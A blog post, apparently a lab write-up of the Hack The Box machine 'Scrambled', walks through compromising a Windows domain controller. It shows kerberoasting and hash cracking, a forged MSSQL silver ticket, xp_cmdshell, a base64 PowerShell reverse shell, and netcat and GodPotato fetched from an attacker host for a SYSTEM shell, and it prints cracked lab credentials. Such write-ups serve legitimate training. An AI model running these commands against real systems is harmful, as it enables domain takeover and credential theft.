---
layout: post
title: "scrambled"
date: 2025-10-24 
categories: CPTS Playlist
---
# scrambled

# Summary

- username leaked in IT support page; user’s password was its username; valid domain acount
- kerberoasting to get sqlsvc TGS hash
- hashcat to crack the hash
- silver ticket attack; use getUserSPNs to get SPN; use sqlsvc’s password to derive NTLM; use getPac to get domain SID; forge administrator ticket TGS for mssql
- kinit to get TGS ticket as admin; mssqlclient with kerberos authentication; find miscsvc password
- enable xp_cmdshell; base64 encode nishang tcp reverse shell; execute payload with powershell
- reverse shell onto dc1; have SeImpersonatePrivilege
- Use GotPotato exploit to get SYSTEM shell

# Attack Path

First enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/scrambled 10.10.11.168

53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Scramble Corp Intranet
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-24 09:38:36Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-24T09:40:01+00:00; +3s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-24T09:40:01+00:00; +3s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2025-10-24T09:40:01+00:00; +3s from scanner time.
| ms-sql-info:
|   10.10.11.168:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-24T09:37:11
|_Not valid after:  2055-10-24T09:37:11
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
|_ssl-date: 2025-10-24T09:40:01+00:00; +3s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
|_ssl-date: 2025-10-24T09:40:01+00:00; +3s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

```

From the output we can tell that this a Windows DC. Let’s add the domain name and DC host name to our /etc/hosts:

```bash
10.10.11.168 scrm.local DC1.scrm.local
```

## SMB

Let’s see if null authentication is permitted:

```bash
nxc smb scrm.local -u '' -p '' --shares

SMB         10.10.11.168    445    10.10.11.168     [*]  x64 (name:10.10.11.168) (domain:10.10.11.168) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.10.11.168    445    10.10.11.168     [-] 10.10.11.168\: STATUS_NOT_SUPPORTED 
SMB         10.10.11.168    445    10.10.11.168     [-] Error enumerating shares: STATUS_USER_SESSION_DELETED
```

NTLM is not enabled. We need kerberos to authenticate. 

Not much else to enumerate without a valid domain user account. 

## Web

Let’s visit the web server:

![image.png]({{ site.baseurl }}/assets/scrambled/image.png)

In the IT Services tab, we see this message:

![image.png]({{ site.baseurl }}/assets/scrambled/image%201.png)

And there are some instructions in how to contact IT support and request creation of new user. Let’s fuzz for subdomains and subdir:

```bash
ffuf -u http://10.10.11.168 -H "Host: FUZZ.scrm.local" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 2313

#nothing

ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://scrm.local/FUZZ -ic

images                  [Status: 301, Size: 148, Words: 9, Lines: 2, Duration: 39ms]
Images                  [Status: 301, Size: 148, Words: 9, Lines: 2, Duration: 15ms]
assets                  [Status: 301, Size: 148, Words: 9, Lines: 2, Duration: 15ms]
IMAGES                  [Status: 301, Size: 148, Words: 9, Lines: 2, Duration: 15ms]
Assets                  [Status: 301, Size: 148, Words: 9, Lines: 2, Duration: 19ms]

```

Let’s scan with nmap again:

```bash
sudo nmap -p- 10.10.11.168 -v --min-rate=10000

<SNIP>
4411/tcp  open  found
9389/tcp  open  adws
49666/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49698/tcp open  unknown
61933/tcp open  unknown
61955/tcp open  unknown

```

Some new additional ports found. Let’s scan them with default script:

```bash
sudo nmap -p 4411,9389 10.10.11.168 -sC -sV -oN nmap/scrambled2

4411/tcp open  found?
| fingerprint-strings:
	|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns:
|     SCRAMBLECORP_ORDERS_V1.0.3;
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions:
|     SCRAMBLECORP_ORDERS_V1.0.3;
|_    ERROR_UNKNOWN_COMMAND;
9389/tcp open  mc-nmf  .NET Message Framing

```

In the IT services page, we find a page concerning sales order.

![image.png]({{ site.baseurl }}/assets/scrambled/image%202.png)

Port 4411 seem to map to the sales order.

![image.png]({{ site.baseurl }}/assets/scrambled/image%203.png)

In the Contacting IT support page, one username was leaked:

![image.png]({{ site.baseurl }}/assets/scrambled/image%204.png)

```bash
ksimpson
```

Let’s see if the user has `DONT_REQ_PREAUTH` set:

```bash
nxc ldap dc1.scrm.local -u ksimpson -p '' --asreproast asreproast.out
```

```bash
impacket-GetNPUsers scrm.local/ -dc-ip 10.10.11.168 -no-pass -usersfile users.txt

[-] User ksimpson doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Nope. Let’s try guessing the password:

```bash
nxc smb dc1.scrm.local -u ksimpson -p ksimpson -k 

SMB         dc1.scrm.local  445    dc1              [*]  x64 (name:dc1) (domain:scrm.local) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc1.scrm.local  445    dc1              [+] scrm.local\ksimpson:ksimpson 
```

…

## Enumerate with valid domain account

Now that we have a valid domain account, let’s enumerate:

```bash
nxc smb dc1.scrm.local -u ksimpson -p ksimpson -k --shares

SMB         dc1.scrm.local  445    dc1              Share           Permissions     Remark
SMB         dc1.scrm.local  445    dc1              -----           -----------     ------
SMB         dc1.scrm.local  445    dc1              ADMIN$                          Remote Admin
SMB         dc1.scrm.local  445    dc1              C$                              Default share
SMB         dc1.scrm.local  445    dc1              HR                              
SMB         dc1.scrm.local  445    dc1              IPC$            READ            Remote IPC
SMB         dc1.scrm.local  445    dc1              IT                              
SMB         dc1.scrm.local  445    dc1              NETLOGON        READ            Logon server share 
SMB         dc1.scrm.local  445    dc1              Public          READ            
SMB         dc1.scrm.local  445    dc1              Sales                           
SMB         dc1.scrm.local  445    dc1              SYSVOL          READ            Logon server share 
```

Let’s see what’s in the Public share:

```bash
nxc smb dc1.scrm.local -u ksimpson -p ksimpson -k --shares --spider Public --regex .

SMB         dc1.scrm.local  445    dc1              //dc1.scrm.local/Public/. [dir]
SMB         dc1.scrm.local  445    dc1              //dc1.scrm.local/Public/.. [dir]
SMB         dc1.scrm.local  445    dc1              //dc1.scrm.local/Public/Network Security Changes.pdf [lastm:'2021-11-05 13:45' size:630106]
```

Let’s download the file. First, let’s generate a krb5.conf and request a kerberos ticket, this will make enumeration easier. 

```bash
nxc smb dc1.scrm.local -k -u ksimpson -p ksimpson --generate-krb5-file scrm.krb5

[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = SCRM.LOCAL

[realms]
    SCRM.LOCAL = {
        kdc = dc1.scrm.local
        admin_server = dc1.scrm.local
        default_domain = scrm.local
    }

[domain_realm]
    .scrm.local = SCRM.LOCAL
    scrm.local = SCRM.LOCAL
```

Let’s copy that file over to our /etc/krb5.conf:

```bash
sudo cp scrm.krb5 /etc/krb5.conf
```

Now let’s use smbclient to download the pdf. First request a ticket:

```bash
kinit ksimpson

#verify 
klist

Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: ksimpson@SCRM.LOCAL

Valid starting       Expires              Service principal
10/24/2025 06:27:01  10/24/2025 16:27:01  krbtgt/SCRM.LOCAL@SCRM.LOCAL
        renew until 10/25/2025 06:26:58
```

```bash
smbclient --use-krb5-ccache=/tmp/krb5cc_1000 //dc1.scrm.local/Public

get "Network Security Changes.pdf"

```

![image.png]({{ site.baseurl }}/assets/scrambled/image%205.png)

Let’s also map out the domain with bloodhound-python:

```bash
bloodhound-python -u ksimpson -p ksimpson -ns 10.10.11.168 -d scrm.local -c all

nxc ldap dc1.scrm.local -u 'ksimpson' -p 'ksimpson' --dns-server 10.10.11.168 -k --bloodhound --collection All
```

Both commands failed. We could not authenticate to LDAP.

Let’s find kerberoastable accounts:

```bash
nxc ldap dc1.scrm.local -u 'ksimpson' -p 'ksimpson' -k --kerberoasting kerberoasting.out
```

Let’s attempt to crack the password with hashcat:

```bash
.\hashcat.exe -m 13100 ..\hashes.txt ..\rockyou.txt

svc_sql:Pegasus60
```

We can also get all users:

```bash
nxc smb dc1.scrm.local -u 'ksimpson' -p 'ksimpson' -k --users

SMB         dc1.scrm.local  445    dc1              -Username-                    -Last PW Set-       -BadPW- -Description-                    
SMB         dc1.scrm.local  445    dc1              administrator                 2021-11-08 00:35:59 0       Built-in account for administering the computer/domain
SMB         dc1.scrm.local  445    dc1              Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         dc1.scrm.local  445    dc1              krbtgt                        2020-01-26 19:15:47 0       Key Distribution Center Service Account
SMB         dc1.scrm.local  445    dc1              tstar                         2021-11-05 14:55:51 0        
SMB         dc1.scrm.local  445    dc1              asmith                        2020-02-08 22:29:01 0        
SMB         dc1.scrm.local  445    dc1              sjenkins                      2020-02-08 23:11:26 0        
SMB         dc1.scrm.local  445    dc1              sdonington                    2020-02-08 23:11:54 0        
SMB         dc1.scrm.local  445    dc1              backupsvc                     2021-10-31 20:49:04 0       Backup system service 
SMB         dc1.scrm.local  445    dc1              jhall                         2021-10-31 21:09:23 0        
SMB         dc1.scrm.local  445    dc1              rsmith                        2021-10-31 21:09:54 0        
SMB         dc1.scrm.local  445    dc1              ehooker                       2021-11-03 19:02:41 0        
SMB         dc1.scrm.local  445    dc1              khicks                        2021-11-01 15:36:08 0        
SMB         dc1.scrm.local  445    dc1              sqlsvc                        2021-11-03 16:32:02 0       SQL server 
SMB         dc1.scrm.local  445    dc1              miscsvc                       2021-11-03 18:07:47 0       Miscellaneous scheduled tasks and services
SMB         dc1.scrm.local  445    dc1              ksimpson                      2021-11-04 00:30:57 0
```

We see three service accounts.

Let’s only get the users and put it in a file:

```bash
awk '{print $5}' users.txt > valid_users.txt
```

Let’s perform a password spray and see if sqlsvc’s password is reused:

```bash
nxc smb dc1.scrm.local -u valid_users.txt -p Pegasus60 -k --continue-on-success

SMB         dc1.scrm.local  445    dc1              [+] scrm.local\sqlsvc:Pegasus60
```

Only sqlsvc’s is valid. Let’s check if we can access mssql. First, let’s request a TGT:

```bash
kinit sqlsvc

#verify

klist

Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: sqlsvc@SCRM.LOCAL

Valid starting       Expires              Service principal
10/24/2025 09:26:55  10/24/2025 19:26:55  krbtgt/SCRM.LOCAL@SCRM.LOCAL
        renew until 10/25/2025 09:26:48
```

authenticate to mssql server:

```bash
nxc mssql dc1.scrm.local -u sqlsvc -p Pegasus60 -k --local-auth

export KRB5CCNAME=/tmp/krb5cc_1000

impacket-mssqlclient dc1.scrm.local -k

[*] Encryption required, switching to TLS
[-] ERROR(DC1): Line 1: Login failed for user 'SCRM\sqlsvc'.

```

Failed.

Since we have the service ticket’s password, we can perform the silver ticket attack. 

The Silver Ticket attack exploits the Kerberos authentication protocol in Active Directory (AD) by forging a Ticket Granting Service (TGS) ticket, allowing an attacker to impersonate any user for a specific service. The key lies in the service account’s NTLM hash, which is used to encrypt and validate the TGS ticket.

- A TGS ticket is issued by the Key Distribution Center (KDC) to allow a user to access a specific service (e.g., SMB on dc1.scrm.local).
- The ticket is **encrypted** with the **NTLM hash** of the service account (e.g., DC1$ for a computer account or MSSQLSvc for a SQL service).
- The ticket includes the **user’s identity** (e.g., Administrator) and permissions, but the service only verifies the ticket’s integrity using its own NTLM hash.

This means, if we have the password for the service account, we can convert it to NTLM hash. Then with the NTLM hash, we can forge a TGS ticket that include the user identity admin, then use that TGS to access the service as that user. 

First convert password to NTLM:

```bash
echo -n "Pegasus60" | iconv -t UTF-16LE | openssl md4 -binary | xxd -p -c 32

b999a16500b87d17ec7f2e2a68778f05
```

Now let’s get the administrator SID. We can use [getP](http://getPT.py)ac.py:

```bash
impacket-getPac -targetUser administrator scrm.local/ksimpson:ksimpson

UserId:                          500

Domain SID: S-1-5-21-2743207045-1827831105-2542523200

```

Now let’s use **impacket-GetUserSPNs** to get the SPN:

```bash
impacket-GetUserSPNs scrm.local/sqlsvc -dc-host dc1.scrm.local -k -no-pass

ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 12:32:02.351452  2025-10-24 10:35:58.293908             
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 12:32:02.351452  2025-10-24 10:35:58.293908 
```

Now let’s forge our TGS ticket with ticketer.py:

```bash
impacket-ticketer -spn 'MSSQLSvc/dc1.scrm.local' -domain-sid 'S-1-5-21-2743207045-1827831105-2542523200' -user-id 500 -nthash b999a16500b87d17ec7f2e2a68778f05 -domain scrm.local Administrator

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for scrm.local/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```

Now let’s try logging in:

```bash
KRB5CCNAME=Administrator.ccache impacket-mssqlclient dc1.scrm.local -k
```

![image.png]({{ site.baseurl }}/assets/scrambled/image%206.png)

We are on.

Let’s enumerate:

```bash
SELECT name FROM master.dbo.sysdatabases

name         
----------   
master       

tempdb       

model        

msdb         

ScrambleHR 
```

ScrambleHR is the only non-default datatbase. Let’s check it out:

```bash
USE ScrambleHR 

SELECT table_name FROM ScrambleHR .INFORMATION_SCHEMA.TABLES

table_name   
----------   
Employees    

UserImport   

Timesheets 

select * from Employees    

#no result

select * from UserImport

LdapUser   LdapPwd             LdapDomain   RefreshInterval   IncludeGroups   
--------   -----------------   ----------   ---------------   -------------   
MiscSvc    ScrambledEggs9900   scrm.local                90               0 

select * from Timesheets 

#no result
```

Let’s also check with nxc, whether we have execution rights:

```bash
export KRB5CCNAME=Administrator.ccache

nxc mssql dc1.scrm.local --use-kcache
```

Does not work. 

Let’s do it manually, since we are administrator on mssql, we should be able to get command execution.

In our mssql session, try executing:

```bash
xp_cmdshell whoami

ERROR(DC1): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.

```

Let’s enable it:

```bash
enable_xp_cmdshell

xp_cmdshell whoami

output        
-----------   
scrm\sqlsvc   

NULL 
```

Now let’s get a reverse shell. Let’s use nishang’s TCP-one-liner and create our base64 payload:

```bash
cat shell.ps1 | iconv -t utf-16le | base64 -w 0

JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA2AC4ANQAnACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA
```

Now let’s start our listener and execute on mssql server:

```bash
nc -lnvp 4444
```

```bash
powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA2AC4ANQAnACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA
```

Now we have shell:

![image.png]({{ site.baseurl }}/assets/scrambled/image%207.png)

## Privilege Escalation

Let’s check our privileges:

```bash
Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```

We have SeImpersonatePrivilege. Let’s attempt to escalate our privilege with potato exploits.

Let’s use GotPotato. We can download the exploit from here:

[https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)

Download the zip file and extract the exploit and transfer to target:

```bash
#on attack
python3 -m http.server 8001

#on target 
cd C:\Users\sqlsvc\Desktop
curl http://10.10.16.5:8001/nc.exe -o nc.exe
```

Let’s try using godpotato. Upload to server

```bash
curl -o gp.exe http://10.10.16.5:8001/GodPotato-NET4.exe
```

Now let’s execute:

```bash
.\gp.exe -cmd ".\nc.exe -t -e C:\Windows\System32\cmd.exe 10.10.16.5 4444"
```

![image.png]({{ site.baseurl }}/assets/scrambled/image%208.png)

We are now NT SYSTEM.